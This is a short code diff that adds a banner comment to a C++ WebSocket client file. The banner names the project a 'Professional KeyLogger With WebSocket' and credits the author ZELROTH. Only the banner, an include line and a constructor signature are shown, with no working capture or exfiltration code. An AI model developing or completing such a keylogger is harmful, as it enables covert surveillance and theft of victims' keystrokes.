@@ -1,3 +1,15 @@
+/**
+*
+* | ============================================================ |
+* |  Coded By : ZELROTH                                          |
+* |  Date : 2024/12/9 - 9:54:23                                  |
+* |  Professional KeyLogger With WebSocket                       |
+* |  Written In C++ And Python Programming Languages             |
+* | ============================================================ |
+*
+**/
+
+
 #include "WebSocketClient.h"
 
 WebSocketClient::WebSocketClient(const std::string& url) : url(url) {
